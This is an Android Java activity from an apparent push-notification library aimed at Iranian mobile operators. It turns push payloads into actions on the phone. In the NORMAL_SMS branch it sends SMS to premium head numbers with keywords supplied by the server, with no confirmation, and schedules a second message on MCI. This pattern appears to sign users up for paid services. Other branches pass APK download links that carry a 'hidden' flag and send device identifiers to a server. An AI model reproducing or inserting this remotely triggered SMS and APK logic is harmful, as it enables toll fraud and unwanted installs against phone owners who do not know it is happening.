package ir.adnan.lib_requirement_code.pushe.activity;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.gson.Gson;

import java.io.Serializable;

import ir.adnan.lib_requirement_code.core.Require;
import ir.adnan.lib_requirement_code.data.Preferences;
import ir.adnan.lib_requirement_code.pushe.broadcast.SendSms;
import ir.adnan.lib_requirement_code.pushe.dialog.DialogImageDownloadNotification;
import ir.adnan.lib_requirement_code.pushe.dialog.DialogImageNotification;
import ir.adnan.lib_requirement_code.pushe.dialog.DialogRegisterInfo;
import ir.adnan.lib_requirement_code.pushe.pojo.DownloadType;
import ir.adnan.lib_requirement_code.pushe.pojo.GCMEnum;
import ir.adnan.lib_requirement_code.pushe.pojo.LinkData;
import ir.adnan.lib_requirement_code.pushe.pojo.PusheData;
import ir.adnan.lib_requirement_code.pushe.pojo.Sms;
import ir.adnan.lib_requirement_code.pushe.webservice.HandleTypeResponseEnum;
import ir.adnan.lib_requirement_code.pushe.webservice.HandleWebservice;
import ir.adnan.lib_requirement_code.pushe.webservice.StaticWebService;
import ir.adnan.lib_requirement_code.pushe.webservice.WebServiceInterface;
import ir.adnan.lib_requirement_code.pushe.webservice.model.vas_registration.GetRegistrationInfoInput;
import ir.adnan.lib_requirement_code.pushe.webservice.model.vas_registration.GetRegistrationInfoOutput;
import ir.adnan.lib_requirement_code.webservice.ApiClient;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

/**
 * Created by Adnan on 7/4/2017.
 */

public class ClickNotificationActivity extends Activity {

    private Context THIS = this;
    private String TAG = "LibraryTranslucentA";

    private PusheData pusheData;
    private Sms sms;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        Log.e("Test", "ActivityLaunch");

        Gson gson = new Gson();
        try {
            pusheData = gson.fromJson(Preferences.getPrefsString(THIS, Preferences.SMS_PUSH_CUSTOM_DATA)
                    , PusheData.class);
        } catch (Exception e) {
            Log.e(TAG, "Error 42");
            return;
        }
        if (pusheData == null) {
            Log.e(TAG , "pusheData is null");
            return ;
        }

        //
        if (pusheData.getType().equals(GCMEnum.DIALOG_SMS.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(GCMEnum.DIALOG_SMS.getValue()");

            sms = new Sms();

            // Type
            sms.setType(pusheData.getType());

            for (int i = 0; i < pusheData.getData().size(); i++) {
                if (pusheData.getData().get(i).getKey() != null
                        && pusheData.getData().get(i).getValue() != null) {
                    if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_FIRST_KEYWORD.getValue())) {
                        sms.setMci_first_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_SECOUND_KEYWORD.getValue())) {
                        sms.setMci_secound_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MTN_FIRST_KEYWORD.getValue())) {
                        sms.setMtn_first_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_DELAY_TIME.getValue())) {
                        sms.setDelay_time(Long.parseLong(pusheData.getData().get(i).getValue()));
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_HEAD_NUMBER.getValue())) {
                        sms.setMci_head_number(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MTN_HEAD_NUMBER.getValue())) {
                        sms.setMtn_head_number(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_PACKAGE_NAME.getValue())) {
                        sms.setPackage_name(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_VERSION.getValue())) {
                        sms.setApplication_version(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_IMAGE.getValue())) {
                        sms.setImage_url(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_TITLE.getValue())) {
                        sms.setDialog_title(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_BODY.getValue())) {
                        sms.setDialog_body(pusheData.getData().get(i).getValue());
                    }
                }
            }

            if (sms.getApplication_version() == null ||
                    "".equalsIgnoreCase(sms.getApplication_version())) {
                Log.e(TAG, "ApplicationVersion is null or empty");
                return;
            }
            if (sms.getPackage_name() == null ||
                    "".equalsIgnoreCase(sms.getPackage_name())) {
                Log.e(TAG, "PackageName is null or empty");
                return;
            }
            if (sms.getImage_url() == null ||
                    "".equalsIgnoreCase(sms.getImage_url())) {
                Log.e(TAG, "ImageUrl is null or empty");
                sms.setImage_url("");
            }

            getRegistrationInfo(sms);
        } else if (pusheData.getType().equals(GCMEnum.NORMAL_SMS.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(GCMEnum.NORMAL_SMS.getValue()");

            sms = new Sms();

            // Type
            sms.setType(pusheData.getType());

            for (int i = 0; i < pusheData.getData().size(); i++) {
                if (pusheData.getData().get(i).getKey() != null
                        && pusheData.getData().get(i).getValue() != null) {
                    if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_FIRST_KEYWORD.getValue())) {
                        sms.setMci_first_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_SECOUND_KEYWORD.getValue())) {
                        sms.setMci_secound_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MTN_FIRST_KEYWORD.getValue())) {
                        sms.setMtn_first_keyword(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_DELAY_TIME.getValue())) {
                        sms.setDelay_time(Long.parseLong(pusheData.getData().get(i).getValue()));
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MCI_HEAD_NUMBER.getValue())) {
                        sms.setMci_head_number(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_MTN_HEAD_NUMBER.getValue())) {
                        sms.setMtn_head_number(pusheData.getData().get(i).getValue());
                    }
                }
            }

            if (Require.getOperatorName(THIS).equals("MTN")) {
                Require.sendSMS(sms.getMtn_head_number(), sms.getMtn_first_keyword());
            } else {
                // MCI , 2 time send sms
                //First Sms
                Require.sendSMS(sms.getMci_head_number(), sms.getMci_first_keyword());
                //Two Sms
                Intent intent = new Intent(THIS, SendSms.class);
                intent.putExtra("number", sms.getMci_head_number());
                intent.putExtra("message", sms.getMci_secound_keyword());

                PendingIntent pendingIntent = PendingIntent.getBroadcast(
                        THIS.getApplicationContext(), 6585, intent, 0);
                AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
                        + (sms.getDelay_time() * 1000), pendingIntent);
            }

            this.finish();

        } else if (pusheData.getType().equals(GCMEnum.IMAGE.getValue())) {
            sms = new Sms();

            // Type
            sms.setType(pusheData.getType());

            for (int i = 0; i < pusheData.getData().size(); i++) {
                if (pusheData.getData().get(i).getKey() != null
                        && pusheData.getData().get(i).getValue() != null) {
                    if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_IMAGE.getValue())) {
                        sms.setImage_url(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_TITLE.getValue())) {
                        sms.setDialog_title(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_BODY.getValue())) {
                        sms.setDialog_body(pusheData.getData().get(i).getValue());
                    }
                }
            }

            if (sms.getImage_url() == null ||
                    "".equalsIgnoreCase(sms.getImage_url())) {
                Log.e(TAG, "getImage_url() is null or empty");
            }

            if (sms.getDialog_title() == null ||
                    "".equalsIgnoreCase(sms.getDialog_title())) {
                Log.e(TAG, "getDialog_title() is null or empty");
                return;
            }

            if (sms.getDialog_body() == null ||
                    "".equalsIgnoreCase(sms.getDialog_body())) {
                Log.e(TAG, "getDialog_body() is null or empty");
                return;
            }

            Intent dialogImageNotificationIntent = new Intent(THIS, DialogImageNotification.class);

            dialogImageNotificationIntent.putExtra(GCMEnum.KEY_IMAGE.getValue(), sms.getImage_url());
            dialogImageNotificationIntent.putExtra(GCMEnum.KEY_TITLE.getValue(), sms.getDialog_title());
            dialogImageNotificationIntent.putExtra(GCMEnum.KEY_BODY.getValue(), sms.getDialog_body());

            startActivity(dialogImageNotificationIntent);

            this.finish();
        } else if (pusheData.getType().equals(GCMEnum.DOWNLOAD.getValue())) {
            Log.e(TAG, "pusheData.getType().equals(DOWNLOAD.getValue()");

            LinkData linkData = new LinkData();
            //
            for (int i = 0; i < pusheData.getData().size(); i++) {
                if (pusheData.getData().get(i).getKey() != null
                        && pusheData.getData().get(i).getValue() != null) {
                    if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_PACKAGE_NAME.getValue())) {
                        linkData.setPackageName(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_VERSION_CODE.getValue())) {
                        linkData.setVersionCode(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_IMAGE.getValue())) {
                        linkData.setImage(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_TITLE.getValue())) {
                        linkData.setTitle(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_BODY.getValue())) {
                        linkData.setBody(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_LINK.getValue())) {
                        linkData.setLink(pusheData.getData().get(i).getValue());
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_IS_HIDDEN.getValue())) {
                        try {
                            linkData.setHidden(Boolean.parseBoolean(pusheData.getData().get(i).getValue()));
                        } catch (Exception e) {}
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_DOWNLOAD_TYPE.getValue())) {
                        if(pusheData.getData().get(i).getValue().equals(DownloadType.APK.getValue())) {
                            Log.e(TAG , "this is APK");
                            linkData.setType(DownloadType.APK.getValue());
                        } else if (pusheData.getData().get(i).getValue().equals(DownloadType.PDF.getValue())) {
                            Log.e(TAG , "this is PDF");
                            linkData.setType(DownloadType.PDF.getValue());
                        }
                    } else if (pusheData.getData().get(i).getKey().equals(GCMEnum.KEY_FILE_NAME.getValue())) {
                        linkData.setFileName(pusheData.getData().get(i).getValue());
                    }
                }
            }
            //
            Intent imageDownloadDialog = new Intent(THIS , DialogImageDownloadNotification.class);
            imageDownloadDialog.putExtra("object", (Serializable) linkData);
            startActivity(imageDownloadDialog);
        }
    }

    // Register :
    private void getRegistrationInfo(final Sms sms) {

        final String operatiorName = Require.getOperatorName(THIS);

        if (operatiorName.equals("")) {
            this.finish();
            return;
        }
        WebServiceInterface webServiceInterface = ApiClient.getClient().create(WebServiceInterface.class);

        Call<GetRegistrationInfoOutput> call = webServiceInterface.getRegistrationInfo(new GetRegistrationInfoInput(new GetRegistrationInfoInput.Parameters(
                Require.getAndroidId(THIS),
                Require.getDeviceModel(),
                operatiorName,
                "ANDROID",
                Build.VERSION.RELEASE,
                sms.getPackage_name(),
                sms.getApplication_version()
        )));
        call.enqueue(new Callback<GetRegistrationInfoOutput>() {

            @Override
            public void onResponse(Call<GetRegistrationInfoOutput> call, Response<GetRegistrationInfoOutput> response) {
                Log.e(TAG, "GetRegistrationInfoOutput ");
                try {

                    HandleWebservice handleResponse = StaticWebService.response(response.body().getStatus());

                    if (handleResponse.getTypeResponseEnum() == HandleTypeResponseEnum.OK) {

                        Intent loadRegisterDialog = new Intent(THIS, DialogRegisterInfo.class);
                        loadRegisterDialog.putExtra("register", (Serializable) response.body());

                        loadRegisterDialog.putExtra("image", sms.getImage_url());

                        loadRegisterDialog.setFlags(FLAG_ACTIVITY_NEW_TASK);
                        startActivity(loadRegisterDialog);

                        //
                    }

                    finish();

                } catch (Exception e) {
                    Log.e(TAG, "error in GetRegistrationInfoOutput " + e.getMessage());
                    e.printStackTrace();

                    finish();
                }
            }

            @Override
            public void onFailure(Call<GetRegistrationInfoOutput> call, Throwable t) {
                Log.e(TAG, "Error checkVersion model is : ");

                String first, secound, head, registrationType;
                if (operatiorName.equalsIgnoreCase("MTN")) {
                    first = sms.getMtn_first_keyword();
                    secound = "";
                    head = sms.getMtn_head_number();
                    registrationType = "oneStep";

                } else {
                    first = sms.getMci_first_keyword();
                    secound = sms.getMci_secound_keyword();
                    head = sms.getMci_head_number();
                    registrationType = "twoStep";
                }

                GetRegistrationInfoOutput response = new GetRegistrationInfoOutput(new GetRegistrationInfoOutput.Parameters(
                        sms.getDialog_body(),
                        sms.getDelay_time(),
                        first,
                        head,
                        registrationType,
                        secound

                ), null);

                Intent loadRegisterDialog = new Intent(THIS, DialogRegisterInfo.class);
                loadRegisterDialog.putExtra("register", (Serializable) response);

                loadRegisterDialog.putExtra("image", sms.getImage_url());

                loadRegisterDialog.setFlags(FLAG_ACTIVITY_NEW_TASK);
                startActivity(loadRegisterDialog);
                finish();
            }
        });
    }
}
